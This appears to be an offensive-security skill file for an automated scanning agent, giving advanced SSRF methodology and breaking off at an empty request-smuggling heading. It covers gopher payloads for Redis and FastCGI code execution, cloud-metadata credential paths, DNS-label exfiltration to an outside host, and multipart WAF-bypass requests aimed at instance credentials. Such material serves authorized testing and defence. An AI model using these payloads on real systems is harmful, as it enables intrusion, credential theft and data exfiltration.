---
name: ssrf-advanced-deep
description: Advanced SSRF depth — parser and resolver differentials in depth, DNS rebinding TOCTOU methodology, protocol smuggling per protocol (gopher → Redis/FastCGI/SMTP/LDAP/UDS), per-provider cloud-metadata extraction gates (routed to cloud/*), blind-SSRF oracle channels, allowlist and WAF bypass classes, and the canonical Busboy multipart parser-differential block.
sibling: ssrf
load_when: scan_mode == "deep"
---

# SSRF — Advanced Depth

This is the advanced+expert deep sibling to `ssrf.md`. The base owns the primitive model, the reachability catalog, and the IMDSv2-reach-vs-extraction scope discipline; the novel+frontier sibling `ssrf_novel_deep.md` owns the 2024–2026 published class instances. This file owns the operational depth in between and hosts the canonical Busboy/Vercel multipart parser-differential block reused by `xss`/`rce`/`sql_injection`/`ssrf`.

Load this file when the base file's OAST-and-alternate-IP toolkit did not land the finding: the sink is confirmed reachable but a WAF is in the way, DNS pinning appears in place, the target hides behind a rebinding-resistant validator, the primitive is `GET`-only and IMDSv2 needs bypassing structurally, or the sink sits behind a Node ingress where the multipart-parser-differential class is the delivery vector.

## Parser and Resolver Differential Class — In Depth

The base file's takeaway: two parsers disagree, the disagreement is the bug. This section expands the class into the reusable surfaces.

### RFC 3986 vs WHATWG URL divergence

The two live specifications for URL parsing diverge on load-bearing details. Any code path that mixes them (e.g., an allowlist validator using RFC 3986 → an outbound fetcher using WHATWG) is a candidate.

- **Backslash in authority** — WHATWG URL Standard §URL parsing normalizes `\` to `/` in "special" schemes (http/https/ws/wss/ftp/file). RFC 3986 says `\` is not a permitted authority character at all (userinfo grammar is `unreserved / pct-encoded / sub-delims / ":"`; `\` is not in any of those). Parsers strictly following one or the other diverge on `http://127.0.0.1\@example.com/`. The base file's measured matrix confirms the divergence between Python's `urllib.parse` (RFC-3986-shape) and Node's WHATWG URL — with the further divergence that Python's `urllib3` treats the input as an unreserved character in the path, while `httpx` (via `rfc3986`) rejects the ambiguity.
- **Percent-encoded characters in host** — WHATWG requires percent-decoding for hostname comparison; some RFC-3986 parsers do not. `http://127.%30.0.1/` (encoded `0`) reaches loopback on WHATWG-shape fetchers but may not equal `127.0.0.1` in an RFC-3986 allowlist string-compare.
- **IDN and Unicode normalization** — WHATWG uses UTS #46 IDN processing (nontransitional); ICU/libidn variants differ on which Unicode compatibility mappings apply. A hostname `⓵` (encircled digit one) may or may not map to `1` depending on the parser's IDN table version. Rare in practice but a known 2024-2026 research surface.
- **Punycode round-trip** — some validators decode punycode for allowlist compare while the fetcher encodes it before DNS. A punycode host that decodes to an allowlisted string but encodes back to a different host is a parser-differential seam.
- **IPv6 zone identifiers** — `[fe80::1%25eth0]` — zone-index handling differs between parsers; some accept the `%25`-encoded percent sign, others reject or strip; the fetcher may then connect to `[fe80::1]` (no zone) which resolves to a different interface than the validator inspected.
- **Trailing dot in FQDN** — `internal.` vs `internal` — some resolvers treat as equivalent, some don't; DNS lookup for the trailing-dot form may skip search-list expansion, potentially reaching a different name than a bare-hostname lookup.
- **Uppercase vs lowercase** — RFC 3986 says host is case-insensitive; WHATWG normalizes to lowercase; a case-sensitive string allowlist misses `EVIL.com` where `evil.com` is blocked.

For each divergence surface: identify which parser the validator uses (grep for `urlparse`, `urlsplit`, `URL(`, `url.Parse`, `Url::parse`), which parser the fetcher uses (grep for `requests.get`, `fetch(`, `http.Client{}.Get`, `reqwest::get`), then test the divergence input against a mock listener and an OAST callback. The class fingerprint is the emitted request's Host header against what the validator returned.

### Fetcher-parser transformation surfaces

Even when the two parsers agree on the host string, the fetcher may transform the URL before sending:

- **Default-port stripping** — `http://internal.example:80/` may be sent with `Host: internal.example` (port stripped) by some clients; an allowlist that checks the port field explicitly misses the port-stripped form.
- **Path normalization** — `..` segments resolved at parse time vs at request time. `http://internal/foo/../metadata` may be validated as `foo/../metadata` (allowlisted path) but sent as `/metadata` by a normalizing fetcher.
- **Query preservation** — some fetchers reorder query parameters or fold duplicate keys; unlikely to reach a differential but observable in mitmproxy captures.

### Resolve-vs-fetch (TOCTOU) — the resolver side

- Every fetch is preceded by one or more DNS lookups (A/AAAA, sometimes SRV or HTTPS records). The validator's `gethostbyname`/`getaddrinfo` and the fetcher's DNS lookup are separate syscalls unless the code path pins the resolved address.
- **Where the pin lives** — `CURLOPT_RESOLVE` on curl-backed sinks; a custom `Dialer` on Go `net/http`; a `lookup` option on Node undici; connection-pool-cached DNS on Java HttpURLConnection (subject to `networkaddress.cache.ttl` JVM property, default 30s but often -1 for "cache forever" in modern JVMs).
- **How the flip is won** — see DNS Rebinding TOCTOU Methodology below.

### The class hunt lead

The pattern that predicts the next bug: any code path that parses a URL, validates the host string, then hands the *original URL string* to a fetcher, is a candidate. The safe shape is: parse once, resolve the host, pin the resolved IP, hand a URL constructed against the pinned IP (with the original Host header preserved) to the fetcher. Grep for the unsafe shape: `if allowlist.check(urlparse(url).hostname): fetch(url)` — the second `url` is a fresh parse plus a fresh resolve.

## DNS Rebinding TOCTOU Methodology

The primitive: attacker DNS returns IP A on the first lookup (allowlisted), IP B on the second (metadata/loopback). The victim's validator sees A and passes; the fetcher re-resolves and connects to B.

### Preconditions (all-of-N)

1. The victim resolves the hostname (does not accept only IP literals in the URL)
2. The validator runs its check on the resolver's output, not on the URL string alone (a string-only allowlist blocks the attacker's domain regardless of what it resolves to)
3. The fetcher performs an *independent* DNS lookup at request time — no cached-and-pinned IP from the validator's lookup
4. The rebind window (time between the validator's and fetcher's lookups) is longer than the TTL of the first answer, or the attacker controls the flip mid-window

Miss any one and the class does not apply. State each in the finding.

### Winning the flip

- **Singularity of Origin** — the canonical framework. Runs an authoritative DNS that flips A-record answers on schedule, a manager UI showing the flip state, and target-specific payloads (WebRTC leaks, browser rebinding, server-side rebinding). Setup: `git clone https://github.com/nccgroup/singularity && npm install && npm start`; DNS-delegate a subdomain of a domain you control to the Singularity server; use the emitted rebinder hostname in your SSRF payload.
- **rbndr** — public two-IP rebinder: `<publicIP-hex>.<internalIP-hex>.rbndr.us` alternates by lookup. Quick for smoke tests but ephemeral and unauthenticated.
- **Multiple-A records** — return two A records in the first response; the resolver caches both; the validator may inspect the first while the fetcher connects to the second, without needing a TTL flip.
- **DNS answer flooding** — return many A records for the same lookup; some resolvers randomly select; a single trial has probabilistic outcome.
- **TTL 0 or 1** — the validator's cache expires between the two lookups; the second lookup fresh-fetches the flipped answer.

### getaddrinfo scheduling nuance

On Linux, `getaddrinfo` may cache within a single process (nscd, systemd-resolved, or the libc resolver's built-in cache). Different processes on the same host may see different answers. If the validator and fetcher run in different worker processes, per-process caches decouple; if in the same worker, per-worker cache aligns them. The class depends on which pattern the target uses.

### Per-library re-resolve behavior

Whether a fetch re-resolves the hostname depends on the library. Rebinding wins where the fetcher re-resolves; loses where it doesn't.

- **`curl_easy_perform`** with a persistent handle — re-resolves on each `perform()` unless `CURLOPT_RESOLVE` pins.
- **`curl_multi` with `HTTP/2`** — connection pooling may reuse the existing TCP connection to the previously-resolved IP; the pin is *de facto* through connection reuse. Explicit `CURLOPT_RESOLVE` is still preferred.
- **Guzzle** — uses libcurl under the hood; re-resolves per request unless a `curl.options` array sets `CURLOPT_RESOLVE`. This is the Craft CMS TOCTOU shape (see `ssrf_novel_deep.md`'s CVE-2026-27127).
- **Python `requests`** — uses `urllib3.PoolManager`; DNS is resolved by the connection pool, cached per host+port for the pool's lifetime. Under connection reuse, no re-resolve. Under a fresh pool or after connection drop, re-resolve. `Session()` object lifetime matters.
- **Python `httpx`** — similar pool behavior; the `httpx.Client.transport` config controls.
- **Node undici** — configurable `lookup` option; default uses `dns.lookup` per new connection.
- **Go `net/http`** — the default `Transport` uses `net.DefaultResolver` at dial time; connections are pooled per host+port; DNS is not cached inside the transport (relies on OS resolver behavior); custom `Transport.DialContext` can pin.
- **Java HttpURLConnection** — respects `networkaddress.cache.ttl`; by default caches indefinitely on Oracle JVM, 30s on OpenJDK; rebinding on JVM targets often requires waiting the full TTL or forcing a JVM restart, both impractical.

### Cache-defeat techniques

- Use a fresh hostname per request (`<nonce>.rebinder.attacker.tld`); every lookup is fresh from the authoritative
- Vary URL query parameters to force new connection pools where the pool keys on more than host+port
- Force connection close via `Connection: close` when the sink accepts the header — new connection = new DNS lookup on some clients

### The class fingerprint

Signal that DNS rebinding worked: the OAST callback source IP matches loopback / metadata IP, not the attacker's DNS server. Signal that DNS pinning is in place: the fetch consistently hits the attacker-controlled first-lookup IP, ignoring the TTL flip.

### Advanced rebinding variants

- **Response rebinding** — the same primitive but the validator inspects the response's URL (e.g., open-redirect target), not the request URL. The attacker's DNS returns different answers per lookup; the validator sees the safe URL, the response-processing code re-resolves and reaches internal
- **TLS ALPN rebinding** — with HTTPS-scheme sinks, the TLS SNI is chosen at connect time based on the hostname. Rebinding-flipped IP still receives the original SNI; a target IP that answers TLS for one SNI but rejects another creates a distinctive handshake shape usable as an oracle
- **HTTP/2 SETTINGS smuggling on rebound connections** — HTTP/2 connections coalesce (a single connection can serve multiple hosts if the certificate covers both). Rebinding to a target that shares a certificate with the allowlisted host can reuse the existing HTTP/2 connection, bypassing DNS pinning that only applies to new connections
- **Browser-based rebinding for hybrid SSRF+CSRF** — when the sink is a client-side JS fetch that will later be replayed server-side (rare but present in some webhook designs), the rebinding flip fires the browser's fetch against internal from within the browser's own network position
- **Multi-record with SRV / HTTPS DNS types** — RFC 9460 HTTPS records may carry the target's IP separately from the A record; a validator resolving A while the fetcher uses HTTPS-record IP is a bypass

### DNS-cache defeat by client

Some clients cache DNS aggressively; defeats:
- **Java** (`networkaddress.cache.ttl` default indefinite on Oracle JDK, 30s on OpenJDK) — practical rebinding on JVM often requires TTL wait; use `--force-dns` shape mitigation-recognition in fingerprinting
- **`nscd`/`systemd-resolved` on the target host** — cache TTL enforced regardless of DNS answer TTL; test whether the client bypasses the system resolver via `dns.lookup` options
- **Cloudflare `1.1.1.1` DoH** — DNS-over-HTTPS resolvers may cache per resolver's policy, not per authoritative TTL; less common in server-side sinks but present in edge-runtime fetchers

## Protocol Smuggling via SSRF

The base file names gopher/dict/file as reach candidates on curl-backed sinks. This section owns the per-protocol payload construction.

### Gopher — the widest reach

`gopher://host:port/_<data>` sends `<data>` as a raw TCP stream after the leading `_`, with CRLFs URL-encoded as `%0d%0a`. That lets the primitive speak any line-based protocol.

**Redis (unauth, `:6379`) — three RCE writes**:

- **Cron entry** — write `/var/spool/cron/root` or `/var/spool/cron/crontabs/root` with a curl-back-shell entry. RESP structure via Gopherus: `gopher://127.0.0.1:6379/_%2A2%0D%0A%244%0D%0AAUTH%0D%0A...` (Gopherus emits the full string; do not hand-craft RESP).
  ```bash
  gopherus --exploit redis
  # → prompts for the payload type (cron/authkey/webshell), server IP, listener IP
  # → emits gopher://... URL to paste into the SSRF sink
  ```
- **`~/.ssh/authorized_keys`** — write an SSH public key to a service user's home; requires the Redis process to run as the user whose home is writable
- **Webshell** — set `dir` to a webroot, `dbfilename` to `shell.php`, `SET` a key holding PHP, `SAVE` — writes a PHP file under a webserver's docroot
- **`MODULE LOAD`** — load a malicious `.so` shared library; requires the DBA to have module loading enabled (post-Redis 7 default enables limited module loads; unauth `MODULE LOAD` is gated on some builds)

**FastCGI / PHP-FPM (`:9000`)** — craft a FastCGI record setting `PHP_VALUE=auto_prepend_file=php://input` (or `allow_url_include=1`) with attacker PHP in the body. Result: PHP execution on the FPM worker even when no PHP file is web-reachable.
```bash
gopherus --exploit fastcgi
# → emits gopher://.../ record for PHP execution via FCGI
```

**SMTP** — `MAIL FROM`, `RCPT TO`, `DATA`, message body, `.\r\n`. Send email from the target's internal SMTP relay as any address.

**LDAP** — `bind`, `search`, `modify` — leak directory info or modify entries from an internal LDAP with no outbound-visible request.

**Elasticsearch/Redis Sentinel/other line-protocol** — anything that speaks a newline-delimited protocol over TCP is reachable if the sink is curl-backed.

Gopher reach precondition: **curl-backed sink** (or an HTTP client with explicit gopher handler — rare). Node `fetch`, Python `requests`, Go `http.Get`, Rust `reqwest` all reject `gopher://`. Fingerprint the sink's HTTP client before assuming gopher works.

### `dict://`

- `dict://host:port/COMMAND:ARG` — reaches port with a specific `COMMAND` line
- Redis: `dict://localhost:6379/CONFIG:SET:dir:/var/spool/cron` — but `dict:` cannot chain multiple commands the way gopher can
- Memcached: `dict://localhost:11211/stat` for enumeration
- Narrower reach than gopher; useful when the sink allows `dict:` but not `gopher:`

### `file://`

- `file:///etc/passwd`, `file:///proc/self/environ`, `file:///proc/self/status` when the fetcher accepts `file:` and the sink permits arbitrary schemes
- On curl-backed sinks, `file://` reach is enabled by default
- Python `urllib` handles `file:`; `requests` does not without a custom adapter

### `http+unix://` / Unix domain socket reach

- Emerging class in 2024-2026 (see `ssrf_novel_deep.md`'s Node CVE-2026-21636)
- Reach depends on the fetcher: **curl** supports `--unix-socket <path>` (flag, not URL scheme); **undici** supports `socketPath` option on request; **Python `requests` + `requests-unixsocket`** supports `http+unix://%2Fvar%2Frun%2Fdocker.sock/...`
- Reach targets: Docker daemon (`/var/run/docker.sock`), containerd, Kubernetes CRI socket, systemd-notify, journald, PostgreSQL/MySQL Unix sockets, pgBouncer
- The primitive question: does the SSRF sink translate to the underlying HTTP client with the socket-path parameter attacker-controllable? If yes, arbitrary UDS reach; if no, the class does not apply.

### `jar:` / `netdoc:` / `smb:` / `expect://`

- Java-specific: `jar:` and `netdoc:` handlers reach JAR-file contents and remote URL fetches; some Java stacks disable them via `sun.net.spi.namespace`
- SMB — Windows-only, requires the sink's Windows Networking stack; a UNC path in a `file:` scheme can trigger SMB authentication leaks (NTLM hashes captured via Responder)
- `expect://` — PHP-specific wrapper enabling command execution if PHP has the extension installed; combined with `file:`/`php://` a full RCE chain

### Version-fingerprint before firing

- Redis 7+ default `protected-mode` blocks connections from non-loopback interfaces; the sink reaching localhost Redis is still exploitable, but a Redis reached through a network hop is not without auth
- Redis 6+ ACLs may require `AUTH <user> <password>` — a gopher payload against ACL-enabled Redis fails silently unless AUTH is prepended
- PHP-FPM 8+ pool configs may set `security.limit_extensions = .php` which blocks the `auto_prepend_file` chain if the input filename doesn't end in `.php`

## Per-Provider Cloud-Metadata Extraction Gates

**Reach and extraction are separate primitives.** SSRF reaches the metadata endpoint; extraction requires satisfying the per-provider gate (header, method, path). This section is the routing map from an SSRF reachability finding to the credential-extraction chain — the extraction ordering lives in `cloud/*`.

### AWS IMDSv2 — the load-bearing gate class

The gate is: `PUT /latest/api/token` with header `X-aws-ec2-metadata-token-ttl-seconds: <N>` (returns a token), then GET on `/latest/meta-data/iam/security-credentials/<role>` with header `X-aws-ec2-metadata-token: <token>` (returns creds). Both requests must succeed within the token TTL.

- **The primitive question**: does the SSRF sink support (a) `PUT` method, (b) attacker-controlled request headers on both requests? If either is missing, IMDSv2 is unreachable structurally; the target may still be on IMDSv1 (which requires only a GET), so probe both.
- **IMDSv1 gate**: single `GET /latest/meta-data/iam/security-credentials/<role>` — no header required. Available on old instances or instances explicitly configured to permit IMDSv1 (`HttpEndpoint=enabled` + `HttpTokens=optional`).
- **Hop limit** (`HttpPutResponseHopLimit`) — default was 1; per-account default now 2 on new accounts (see `ssrf_novel_deep.md` for the ECS-on-EC2 hardening-gap class); each network hop between the SSRF-caller and the metadata endpoint decrements the response's IP TTL by 1. A container behind a bridge network adds a hop; from an in-container SSRF, hop=1 means the response is dropped at the pod boundary.
- **Route the extraction chain to `cloud/aws.md`**, which owns the token minting, hop-limit fingerprinting, and IAM role usage.

### GCP metadata — single-header gate

- Endpoint: `http://metadata.google.internal/computeMetadata/v1/`
- Gate: `Metadata-Flavor: Google` header (case-insensitive) on the GET
- If the SSRF sink permits custom headers, this is a single-turn extraction
- Route the SA-token usage and Vertex/GCS API follow-through to `cloud/gcp.md`

### Azure IMDS — single-header gate

- Endpoint: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
- Gate: `Metadata: true` header
- MSI token: `/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F`
- Route to `cloud/azure.md`

### Oracle OCI

- v2: `http://169.254.169.254/opc/v2/instance/` with `Authorization: Bearer Oracle`
- v1 (deprecated but often reachable): `http://169.254.169.254/opc/v1/instance/` — no header required
- Instance-principal material at `/opc/v2/instance/`
- Route to `cloud/*` when Oracle-specific coverage is added

### Alibaba Cloud

- `http://100.100.100.200/latest/meta-data/` — non-standard IP, no auth header
- RAM-role credentials at `/latest/meta-data/ram/security-credentials/<role-name>`

### DigitalOcean

- `http://169.254.169.254/metadata/v1/` — no auth header
- `user-data` at `/metadata/v1/user-data` frequently carries provisioning secrets

### Kubernetes API server + SA tokens

- API: `https://kubernetes.default.svc/`
- Auth: `Authorization: Bearer <SA token>` from `/var/run/secrets/kubernetes.io/serviceaccount/token`
- SA token needs FS read (chain with `path_traversal_lfi_rfi`), *or* the SSRF sink runs inside a pod with the SA token mounted and readable via a separate primitive
- Route to `kubernetes` for the RBAC/lateral-movement ordering

### Kubelet

- 10250 (auth, requires client cert or SA token), 10255 (deprecated read-only, no auth)
- `/pods` — list pods on the node with metadata (secret env vars, container specs)
- `/exec`, `/attach`, `/portForward` — command execution if reachable

## Blind SSRF — Advanced Oracle Channels

The base file's OAST + timing coverage. Depth:

### Statistical timing

- **Control baseline**: 10 samples of the request with a known-reachable target and a known-unreachable target; compute median and MAD (median absolute deviation) for each shape
- **Distributional distance**: KS statistic or Mann-Whitney U to test whether an unknown target's response times come from the "reachable" or "unreachable" distribution; 20+ samples per shape needed for confidence
- **Per-bit sample count**: 5-7 samples, median rules; for blind-extraction over timing, this is the granular protocol
- **Adaptive sample count**: if the shape median differs by less than 2× MAD, double sample count; if more than 5× MAD, one sample suffices

### TLS handshake distinguishability

- HTTPS scheme against an HTTP-only internal port TLS-fails with a distinct latency signature (~10-50ms for a TLS ClientHello + TCP RST)
- HTTPS against a valid TLS server produces a full handshake (~50-200ms depending on cert size, cipher, and network)
- HTTPS against a closed port hangs to the sink's connect timeout
- The three shapes distinguish: connect-refused, TLS-mismatch, valid-TLS — a categorical oracle for probe-response classification without needing a response body

### Cache and CDN differential

- Sink whose fetches are cached produces `X-Cache: HIT` on repeat; predicate that changes the fetched-URL causes MISS on subsequent request
- CDN log side channel — some CDNs expose per-tenant log dashboards; an OAST-back outbound from the SSRF appears in the CDN's own logs (`Age`, `X-Cache-Status`) before the app sees the response

### DNS-only exfil

- Encode data in subdomain labels of the SSRF-injected URL. Some SSRF sinks are called from environments that egress-block HTTP but permit DNS — the OAST resolution succeeds even when the HTTP callback fails
- 63 bytes per label, 253 bytes per name; hex-encode to fit charset
- Per-label bit budget: hex is 4 bits/char, base32 is 5 bits/char, base36 is ~5.17 bits/char. Base32 hits ~315 bits per 63-char label. For a 128-byte secret, ~4 labels suffice — a single DNS lookup carries a small secret whole
- **Randomized label prefix per request** identifies which SSRF fire the DNS hit correlates to. Include a per-request nonce in the label prefix (`<nonce>-<data-fragment>.oast.fun`) so parallel probes' hits are distinguishable at the interactsh log

### CDN-side echo

- Some sinks emit the fetched Content-Type or Content-Length back in a response header without echoing the body; a sink under this pattern leaks whether the target returned JSON vs HTML, size of response, ETag — enough to fingerprint internal services
- **`Age:` header echo** — a sink that caches fetches sets `Age:` on subsequent hits; the numeric age is a per-target signal (a newly-fetched target has `Age: 0`, a cached one has a growing age)

### HTTP/2 stream multiplexing for parallel probing

- HTTP/2 multiplexing on the SSRF sink's connection permits N-way parallel probing; measure the sink's advertised `SETTINGS_MAX_CONCURRENT_STREAMS` before firing
- Head-of-line blocking on the underlying TCP connection introduces a per-stream timing artifact — a stream waiting for TLS resume delays other in-flight streams; confirm HTTP/2 vs HTTP/1.1 at the sink (`ALPN`, `:protocol` pseudoheader) before assuming parallel is real
- HTTP/1.1 pipelining is rarely usable — most modern clients disable it; assume sequential unless HTTP/2 is confirmed

### Connection-pool exhaustion as timing signal

- Holding a slow-response internal target open on the SSRF connection saturates the sink's connection pool; subsequent requests to the sink queue behind — a differential in *sink response time* that is separate from *internal target response time*
- Use with restraint; production sinks may hit connection-pool alarms

### Response-shape hashing for stateful oracle

- For blind extraction against a sink that echoes an ETag or a computed hash (`X-Response-Hash: sha256:...`), the hash acts as a binary oracle — the ETag differs iff the fetched content differs. Cache-poisoning discipline: distinct payloads produce distinct hashes without a body echo

## Allowlist and WAF Bypass Classes

Beyond the base file's encoding and DNS-rebinding coverage. Full WAF-provider posture (Cloudflare, AWS WAF, Vercel, Fastly, Akamai, Imperva) lives in `ssrf_novel_deep.md`'s frontier section — this file owns durable class-shape bypasses.

### Allowlist bypass by shape

- **Substring allowlist** (`if 'internal.example' in url`) — includes any URL with that substring anywhere, including `http://attacker/?internal.example`, `http://internal.example.attacker.tld/`
- **Startswith allowlist** — bypassed by `@`-in-userinfo: `http://internal.example@attacker/`; the validator sees a startswith-match, the fetcher connects to `attacker` per RFC 3986 userinfo semantics
- **Endswith allowlist** — bypassed by subdomain: `http://attacker.internal.example/`; if the validator does `endswith('.internal.example')` and the fetcher does a DNS lookup, the attacker registers `attacker.internal.example` in a controlled domain
- **Regex allowlist without `^`/`$` anchors** — matches anywhere in the URL; injection at any position bypasses
- **Punycode / IDN allowlist** — validator decodes for compare; fetcher encodes for DNS; a punycode host that decodes to allowlisted but encodes differently is a differential seam
- **Case-sensitive allowlist** — RFC 3986 says host is case-insensitive; fetchers lowercase; `EVIL.com` bypasses `evil.com` blocklist on case-sensitive check

### Sink-composition bypasses

- **Two-URL sinks** — the sink accepts a URL that itself contains a URL (nested `?url=...&callback=...`); the validator inspects one, the fetcher processes both
- **Templated URLs** — sinks that build the URL from user input (`url = f"https://api.example/{user_endpoint}?key={user_key}"`) — the sink may allow only the base and slot user input into the path, but a `../` in `user_endpoint` reaches other paths on the same allowlisted host, and a `#` reaches a fragment that some sinks parse as a distinct URL
- **Redirect through allowlisted intermediary** — allowlisted host serves an open redirect to attacker → fetcher follows to attacker → gopher payload against internal

### WAF-level bypass surface

- Body-inspection cap (AWS WAF 8KB default) — payloads past the cap are unfiltered; SSRF payload in a large multipart body
- **Multipart parser-differential class** — the canonical block below owns the four-technique family reusable across `xss`/`rce`/`sql_injection`/`ssrf`
- Encoding depth — WAF URL-decodes once; app decodes twice; SSRF payload at `%2527`-shape encoding depth
- Header size limits — WAF caps request-header size; a payload in a header past the cap is unfiltered

## Busboy Multipart Parser-Differential — Canonical Block

**This is the canonical placement for the shared multipart parser-differential class** reusable across `xss.md`, `rce.md`, `sql_injection.md`, and `ssrf.md`. Other files reference this section by filename (`ssrf_advanced_deep.md` § Busboy Multipart Parser-Differential — Canonical Block).

**Class**: any Busboy/formidable/multer-fronted Node ingress behind a byte-inspecting WAF exhibits four parser-differential surfaces where the WAF interprets the multipart body one way and Busboy interprets it another. The disagreement lets a payload survive WAF inspection and reach the application code unfiltered — a delivery-differential primitive reusable for any post-body injection (XSS reflected in the response, SQLi in a form-field value, SSRF in a URL parameter delivered via multipart, RCE via a filename or a body-derived exec sink).

**Primary source**: Vercel React2Shell bounty disclosure (May 2026), co-authored with Vercel. Two candidate CVEs (`CVE-2025-55182`, `CVE-2025-66478`) named in the initial disclosure summary were retroactively verified against NVD and turned out to reference an unrelated React Server Components deserialization RCE (with `CVE-2025-66478` marked REJECTED as a duplicate of `CVE-2025-55182`); the CVE labels are therefore stripped per §2 discipline and the class is documented by the researcher writeup rather than by CVE ID. The four techniques below are behavior-fingerprinted; the class is a technique catalog, not a Vercel-specific vulnerability.

**The four techniques**

1. **Duplicate `boundary=` parameter**

   `Content-Type: multipart/form-data; boundary=y; boundary=x`

   The WAF's Content-Type parser takes the last `boundary=` value (`x`) and inspects the body relative to boundary `x`. Busboy takes the *first* `boundary=` value (`y`) and parses the body relative to boundary `y`. The attacker constructs a body whose only actual boundary is `y`, with a fake-shape boundary marker for `x` embedded. The WAF sees no valid parts (boundary `x` not present); Busboy sees the real parts (boundary `y` present) and delivers them to the app.

   ```
   Content-Type: multipart/form-data; boundary=y; boundary=x

   --y
   Content-Disposition: form-data; name="url"

   http://169.254.169.254/latest/meta-data/iam/security-credentials/
   --y--
   ```

2. **Non-UTF-8 header byte — WAF fail-open**

   Any header value with a byte that is not valid UTF-8 causes the WAF to fail parsing and fail *open* (forward the request unfiltered). Busboy tolerates the byte and parses normally. Example: byte `0x88` in the `Content-Type` parameter or in the header name.

   ```
   Content-Type: multipart/form-data; boundary=x
   X-Junk\x88: 1
   ```

   The WAF's UTF-8 validator errors, the WAF's fail-open path bypasses SQL/XSS/SSRF rules, the app receives the multipart body unfiltered.

3. **Part-level `charset=utf16le` differential**

   A multipart part with `Content-Type: text/plain; charset=utf16le` — Busboy decodes the body bytes via `ucs2Slice` (UTF-16LE decoding), while the WAF inspects the raw bytes.

   Attacker payload: encode the SQL/JS/URL payload as UTF-16LE on the wire. The raw bytes look like garbage to the WAF (interleaved zero bytes); Busboy decodes to the intended string.

   ```
   Content-Type: multipart/form-data; boundary=x

   --x
   Content-Type: text/plain; charset=utf16le
   Content-Disposition: form-data; name="q"

   <UTF-16LE bytes of ':constructor' or the SQL/SSRF payload>
   --x--
   ```

4. **Dual `Content-Type` headers on one part — conflicting charsets**

   Two `Content-Type` headers on one multipart field with conflicting `charset` values. The WAF honors `charset=utf8` (or the last-declared); Busboy honors the first-declared. Attacker sets `first=utf16le, second=utf8`; Busboy decodes as UTF-16LE while the WAF inspects as UTF-8.

   ```
   Content-Type: multipart/form-data; boundary=x

   --x
   Content-Type: text/plain; charset=utf16le
   Content-Type: text/plain; charset=utf8
   Content-Disposition: form-data; name="q"

   <UTF-16LE bytes>
   --x--
   ```

**Generalization** (the hunt lead)

- The class instance is Busboy, but the *shape* is any WAF-vs-parser disagreement in multipart handling. Formidable, multer, other Node multipart parsers, and even non-Node stacks (Rack's `Rack::Multipart`, Django's multipart handler, Java's Commons FileUpload) have their own boundary-parameter and charset-handling behaviors — each one is a candidate for the same-shape class.
- The four techniques predict two more classes worth probing: (a) any WAF that fails-open on invalid *anything* (not just UTF-8) — try invalid UTF-16, invalid form-data grammar, chunked-transfer encoding malformed; (b) any WAF that inspects only a specific `Content-Type` — try multipart nested inside JSON (a JSON string whose value is a multipart body handed to a nested parser).
- The class is a **delivery vehicle**, not an injection class of its own. It carries any payload the reader might otherwise use — SQL for `sql_injection`, JS for `xss`, gopher URL for `ssrf`, template-injection payload for `rce`.

**Detection**

- Fingerprint the target for Node + Busboy: `X-Powered-By: Express` plus a POST endpoint that accepts multipart. Vercel-hosted apps (`x-vercel-id` header) frequently used this stack pre-patch.
- Probe each of the four techniques individually against a form-post endpoint that the WAF is known to filter (a login form, a search form). Compare the response for filtered vs unfiltered payload; the technique that reaches unfiltered response is the exploitable variant on this target.
- OAST-back for SSRF via multipart, or reflected-payload for XSS/SQLi via multipart — the confirmation channel is class-appropriate per the payload the delivery is carrying.

**Mitigation posture**

- Vercel's WAF patched all four in May 2026. Other Node WAFs (Cloudflare Workers WAF fronting Node ingresses, AWS WAF fronting Lambda-based Node) may or may not have equivalent patches — verify per target. The class survives as a hunt lead against any WAF/parser pair.

**Cross-references** — the base files of `xss`, `rce`, `sql_injection`, and `ssrf` reference this section by filename (`ssrf_advanced_deep.md` § Busboy Multipart Parser-Differential — Canonical Block); their references become filename pointers to this block. The novel sibling `ssrf_novel_deep.md` cites the researcher-writeup instance and points here for the class definition.

## Internal Reachability Enumeration via SSRF

The primitive grants "an attacker-chosen request from position X"; enumerating what X can reach is a distinct methodology from firing a single known-target payload.

### Port scanning through SSRF

- **Connect-vs-timeout differential** — a payload that targets a closed port returns fast (connect-refused); an open port hangs to the sink's connect timeout or returns a response error. Binary-search port ranges with short read-timeouts to reduce noise.
- **HTTP-vs-non-HTTP differential** — an open port that speaks HTTP returns an HTTP-shape response; an open port that speaks a different protocol either times out at the fetcher's HTTP parser or produces a distinct error string (`invalid HTTP response`, `malformed HTTP response line`). The two response shapes distinguish HTTP services from arbitrary TCP services.
- **TLS-vs-plaintext** — an HTTPS-scheme probe against a plaintext port TLS-fails; against a TLS-serving port succeeds; against a closed port hangs. Three-way categorical oracle for service fingerprinting.
- **Rate-limit discipline** — SSRF port scans generate one outbound-request-per-probe; the target's own egress rate limits may throttle. Use `10-50` in-flight parallel probes for a `/24` subnet scan; `1-4` for a `/16`.

### Service fingerprinting

For an open HTTP port:
- Response `Server:` header often names the service (nginx, Apache, gunicorn, Envoy, Jenkins, Grafana)
- Response body shape — a JSON error, an HTML default page, a specific fault-tolerant response shape identifies the framework
- Response status on `/`, `/health`, `/api/v1`, `/version`, `/metrics`, `/actuator/*`, `/api-docs` — each is a distinct fingerprint
- Redirect-location on `/` — some services redirect to `/login`, `/admin`, `/dashboard`

For an open non-HTTP port:
- Send a `HELP\n` or `INFO\n` line via gopher; many services respond with a banner (Redis INFO, memcached STATS, SSH-2.0-*)
- The banner names the service and version; version-fingerprints an exploit chain

### Reachable-service catalog build

For each SSRF, build a JSON catalog:
```json
{"127.0.0.1:6379": "Redis 7.2, unauth", "10.0.5.10:8500": "Consul", "10.0.5.10:9090": "Prometheus", "172.20.3.14:2375": "Docker daemon, unauth"}
```

Every entry is a chain candidate. Route each service's follow-through to its owning skill: Docker → `rce`; Kubernetes → `kubernetes`; Vault/Consul secrets → `information_disclosure`.

## HTTP Request Smuggling via SSRF

When the SSRF sink is HTTP-1.1-based and forwards to a downstream proxy, an attacker who controls the SSRF's request body and headers can construct a request that the sink's forward-parser and the downstream proxy interpret differently — smuggling a second request through the connection.

### Preconditions

1. SSRF sink permits arbitrary headers and body
2. Sink's HTTP client keeps connections alive (default on most)
3. Downstream target is HTTP/1.1 with reusable connections (also common)
4. The sink and downstream disagree on `Transfer-Encoding` vs `Content-Length`, or on chunk parsing

### CL.TE and TE.CL smuggling shapes

